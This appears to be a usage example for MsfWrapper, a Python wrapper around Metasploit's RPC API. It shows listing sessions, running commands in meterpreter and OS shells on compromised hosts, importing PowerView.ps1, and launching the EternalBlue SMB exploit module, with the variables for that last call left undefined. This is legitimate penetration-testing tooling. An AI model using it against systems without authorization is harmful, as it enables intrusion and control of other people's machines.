#!/usr/bin/env python3

import asyncio
from msfclient import RpcClient, MsfAuthError, MsfError
from MsfWrapper import MsfWrapper
from IPython import embed


# Initiate the MsfWrapper class with the RPC client
# These user and pw settings are not necessary as they're already 
# set that way by default if you used the included msfrpc.rc file
# but just here for demonstration
# 'msf_api = MsfWrapper()' would do the exact same thing
user = 'msf'
pw = 'McInerneyWasHere'
msf_api = MsfWrapper(user, pw)
embed()


# Start the asyncio loop
loop = asyncio.get_event_loop()


# Get all the sessions available
print('Getting session data')
fut = asyncio.ensure_future(msf_api.get_sessions())
loop.run_until_complete(fut)
print(msf_api.sess_data)
# Get a session ID for use in run_session_cmd() later
for key in msf_api.sess_data:
    sess_num = key
    break


# Run a command inside the console
cmd = 'echo McInerney was here'
print('\n[*] Running console command: '+cmd)
fut = asyncio.ensure_future(msf_api.run_console_cmd(cmd))
out, err = loop.run_until_complete(fut)
print(out)


# Run a command on a session
cmd = 'dir C:/'
print('\n[*] Running session command: '+cmd)
# This is a list of strings that will cause msf_api to stop looking for further command output
# It is case insensitive
end_strs = ['windows']
fut = asyncio.ensure_future(msf_api.run_session_cmd(sess_num, cmd, end_strs))
out, err = loop.run_until_complete(fut)
if out:
    print('Output: '+out)
if err:
    print('Error: ')
    print(err)


# Drop into an OS shell from meterpreter and run a command
cmd = 'echo McInerney was here'
print('\n[*] Running OS shell command: '+cmd)
end_strs = ['here']
fut = asyncio.ensure_future(msf_api.run_shell_cmd(sess_num, cmd, end_strs))
out, err = loop.run_until_complete(fut)
if out:
    print('Output: '+out)
if err:
    print('Error: ')
    print(err)


# Run a module
mod = 'exploit/windows/smb/ms17_010_eternalblue'
fut = asyncio.ensure_future(msf_api.run_module(mod, target_ips, extra_opts, start_cmd))


# Run a PowerShell command
# Does not matter if it's longer running than the 15s supported by MSF's powershell plugin
cmd = 'sleep 30; Write-Output "McInerney was here"'
print('\n[*] Running slow PowerShell command: '+cmd)
fut = asyncio.ensure_future(msf_api.run_psh_cmd_with_output(sess_num, cmd))
out, err = loop.run_until_complete(fut)
if out:
    print('Output: '+out)
if err:
    print('Error: ')
    print(err)

# Import a PowerShell script
msf_api.psh_import_folder = '/home/dan/tools/MsfWrapper/'
filename = 'PowerView.ps1'
print('\n[*] Importing PowerShell script: '+filename)
fut = asyncio.ensure_future(msf_api.import_psh(sess_num, filename))
out, err = loop.run_until_complete(fut)
if out:
    print('Output: '+out)
if err:
    print('Error: ')
    print(err)


# Run a PowerShell cmdlet
cmd = 'Get-IPAddress'
print('\n[*] Running PowerShell cmdlet: '+cmd)
fut = asyncio.ensure_future(msf_api.run_psh_cmd_with_output(sess_num, cmd))
out, err = loop.run_until_complete(fut)
if out:
    print('Output: '+out)
if err:
    print('Error: ')
    print(err)


# Drop into an IPython shell
# %who or %whos typed inside the shell are good for exploring local variables 
print('\n[*] Dropping into IPython shell')
embed()
